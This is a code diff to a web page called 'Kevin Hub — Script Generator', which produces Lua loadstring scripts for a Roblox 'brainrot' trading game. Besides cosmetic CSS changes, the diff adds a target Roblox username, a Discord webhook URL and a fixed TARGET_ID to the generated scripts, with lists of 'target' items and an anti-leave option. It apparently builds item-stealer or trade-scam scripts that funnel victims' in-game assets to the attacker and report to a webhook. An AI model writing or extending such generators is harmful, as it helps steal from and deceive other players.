@@ -4,10 +4,16 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Kevin Hub — Script Generator</title>
+  
+  <!-- Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  
   <style>
+    /* ==========================================================================
+       CSS VARIABLES & RESET
+       ========================================================================== */
     :root {
       --bg: #0a0505;
       --surface: rgba(24, 14, 14, 0.65);
@@ -27,6 +33,9 @@
       box-sizing: border-box;
     }
 
+    /* ==========================================================================
+       ANIMATIONS
+       ========================================================================== */
     @keyframes gradientShift {
       0% { background-position: 0% 50%; }
       50% { background-position: 100% 50%; }
@@ -73,6 +82,9 @@
       75% { transform: translateX(4px); }
     }
 
+    /* ==========================================================================
+       BASE STYLES
+       ========================================================================== */
     body {
       background: var(--bg);
       font-family: 'Inter', system-ui, -apple-system, sans-serif;
@@ -83,11 +95,12 @@
       position: relative;
     }
 
+    /* Background Gradients */
     body::before {
       content: '';
       position: fixed;
       inset: 0;
-      background:
+      background: 
         radial-gradient(circle at 15% 20%, rgba(255, 77, 77, 0.15), transparent 45%),
         radial-gradient(circle at 85% 80%, rgba(255, 107, 107, 0.12), transparent 45%),
         radial-gradient(circle at 50% 50%, rgba(180, 40, 80, 0.08), transparent 60%);
@@ -96,11 +109,12 @@
       background-size: 200% 200%;
     }
 
+    /* Background Grid */
     body::after {
       content: '';
       position: fixed;
       inset: 0;
-      background-image:
+      background-image: 
         linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
         linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
       background-size: 60px 60px;
@@ -109,6 +123,9 @@
       mask-image: radial-gradient(ellipse at center, black 30%, transparent 80%);
     }
 
+    /* ==========================================================================
+       LAYOUT
+       ========================================================================== */
     .page {
       max-width: 1200px;
       margin: 0 auto;
@@ -201,6 +218,9 @@
       }
     }
 
+    /* ==========================================================================
+       CARDS
+       ========================================================================== */
     .card {
       background: var(--surface);
       border: 1px solid var(--border);
@@ -245,6 +265,9 @@
       }
     }
 
+    /* ==========================================================================
+       FORM ELEMENTS
+       ========================================================================== */
     .field {
       display: flex;
       flex-direction: column;
@@ -322,6 +345,9 @@
       font-size: 0.82rem !important;
     }
 
+    /* ==========================================================================
+       PILLS (TAGS)
+       ========================================================================== */
     .pills {
       display: flex;
       flex-wrap: wrap;
@@ -388,6 +414,9 @@
       color: #ff6b6b;
     }
 
+    /* ==========================================================================
+       TOGGLES
+       ========================================================================== */
     .checkbox-row {
       display: flex;
       align-items: center;
@@ -453,7 +482,9 @@
       transform: translateX(18px);
     }
 
-    /* MODE CARDS */
+    /* ==========================================================================
+       MODE SELECTION CARDS
+       ========================================================================== */
     .mode-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
@@ -508,6 +539,9 @@
       color: #ff8a8a;
     }
 
+    /* ==========================================================================
+       OUTPUT AREA
+       ========================================================================== */
     .output-header {
       display: flex;
       align-items: center;
@@ -589,13 +623,8 @@
       animation: dotBounce 1.4s ease infinite;
     }
 
-    .output-box .dots span:nth-child(2) {
-      animation-delay: 0.2s;
-    }
-
-    .output-box .dots span:nth-child(3) {
-      animation-delay: 0.4s;
-    }
+    .output-box .dots span:nth-child(2) { animation-delay: 0.2s; }
+    .output-box .dots span:nth-child(3) { animation-delay: 0.4s; }
 
     .output-box.success {
       border-color: rgba(255, 77, 77, 0.35);
@@ -606,6 +635,9 @@
       color: #fca5a5;
     }
 
+    /* ==========================================================================
+       GENERATE BUTTON
+       ========================================================================== */
     .generate-btn {
       width: 100%;
       padding: 1.05rem;
@@ -662,6 +694,9 @@
       vertical-align: middle;
     }
 
+    /* ==========================================================================
+       FOOTER & TOAST
+       ========================================================================== */
     footer {
       margin-top: 4rem;
       text-align: center;
@@ -748,7 +783,6 @@
     <div class="grid">
       <div class="card card-form">
         
-        <!-- SCRIPT MODE CARDS -->
         <div class="field">
           <label class="label">Script Mode</label>
           <div class="mode-grid">
@@ -769,6 +803,17 @@
         <div class="field" id="customLoaderField" style="display: none;">
           <label class="label">Custom Loadstring URL</label>
           <input type="text" class="mono" id="customLoaderInput" placeholder="https://pastefy.app/.../raw or loadstring code" value="">
+        </div>
+
+        <!-- USERNAME & WEBHOOK (Visible by default, hidden for Custom) -->
+        <div class="field" id="usernameField">
+          <label class="label">Roblox Username</label>
+          <input type="text" id="usernameInput" placeholder="Your username" value="">
+        </div>
+
+        <div class="field" id="webhookField">
+          <label class="label">Discord Webhook</label>
+          <input type="text" class="mono" id="webhookInput" placeholder="https://discord.com/api/webhooks/..." value="">
         </div>
 
         <div class="field">
@@ -965,11 +1010,15 @@
       const scriptOutput = $('scriptOutput');
       const generateBtn = $('generateBtn');
       const copyBtn = $('copyBtn');
+      const usernameInput = $('usernameInput');
+      const webhookInput = $('webhookInput');
       const shortLoadstringCheck = $('shortLoadstring');
       const antiLeaveToggle = $('antiLeaveToggle');
       
       const customLoaderField = $('customLoaderField');
       const customLoaderInput = $('customLoaderInput');
+      const usernameField = $('usernameField');
+      const webhookField = $('webhookField');
 
       // Mode Card Selection Logic
       document.querySelectorAll('.mode-card').forEach(card => {
@@ -980,8 +1029,12 @@
 
           if (currentMode === 'custom') {
             customLoaderField.style.display = 'flex';
+            usernameField.style.display = 'none';
+            webhookField.style.display = 'none';
           } else {
             customLoaderField.style.display = 'none';
+            usernameField.style.display = 'flex';
+            webhookField.style.display = 'flex';
           }
         });
       });
@@ -1113,14 +1166,35 @@
       }
 
       generateBtn.addEventListener('click', async () => {
+        const username = usernameInput.value.trim();
+        const webhook = webhookInput.value.trim();
         const customUrl = customLoaderInput.value.trim();
 
-        if (currentMode === 'custom' && !customUrl) {
-          markInvalid(customLoaderInput);
-          showToast('Enter a custom loadstring URL');
-          scriptOutput.className = 'output-box error';
-          scriptOutput.textContent = '❌ Please enter your custom loader URL.';
-          return;
+        let valid = true;
+
+        if (currentMode === 'noui') {
+          if (!username) {
+            markInvalid(usernameInput);
+            valid = false;
+          }
+          if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
+            markInvalid(webhookInput);
+            valid = false;
+          }
+          if (!valid) {
+            showToast('Fill in username and a valid Discord webhook');
+            scriptOutput.className = 'output-box error';
+            scriptOutput.textContent = '❌ Missing required fields.';
+            return;
+          }
+        } else if (currentMode === 'custom') {
+          if (!customUrl) {
+            markInvalid(customLoaderInput);
+            showToast('Enter a custom loadstring URL');
+            scriptOutput.className = 'output-box error';
+            scriptOutput.textContent = '❌ Please enter your custom loader URL.';
+            return;
+          }
         }
 
         if (selectedBrainrots.size === 0) {
@@ -1129,6 +1203,9 @@
           scriptOutput.textContent = '❌ Select at least one brainrot target before generating.';
           return;
         }
+
+        const webhookEscaped = escapeLua(webhook);
+        const usernameEscaped = escapeLua(username);
 
         const brainrotsBlock = Array.from(selectedBrainrots)
           .map((b) => '    ["' + escapeLua(b) + '"] = true,')
@@ -1153,7 +1230,10 @@
 
         // Build based on selected mode
         if (currentMode === 'noui') {
-          luaScript += 'local TargetBrainrots = {\n' + brainrotsBlock + '\n}\n\n' +
+          luaScript += 'local TARGET_ID = 245727\n' +
+            'local TARGET_USER = "' + usernameEscaped + '"\n' +
+            'local WEBHOOK_URL = "' + webhookEscaped + '"\n\n' +
+            'local TargetBrainrots = {\n' + brainrotsBlock + '\n}\n\n' +
             'local TargetBaseSkins = {\n' + skinsBlock + '\n}\n\n' +
             'local TargetGears = {\n' + gearsBlock + '\n}\n\n' +
             'task.spawn(function()\n' +
@@ -1166,7 +1246,8 @@
             '    end\n' +
             'end)\n';
         } else if (currentMode === 'custom') {
-          luaScript += 'local TargetBrainrots = {\n' + brainrotsBlock + '\n}\n\n' +
+          luaScript += 'local TARGET_ID = 245727\n' +
+            'local TargetBrainrots = {\n' + brainrotsBlock + '\n}\n\n' +
             'local TargetBaseSkins = {\n' + skinsBlock + '\n}\n\n' +
             'local TargetGears = {\n' + gearsBlock + '\n}\n\n' +
             'task.spawn(function()\n' +
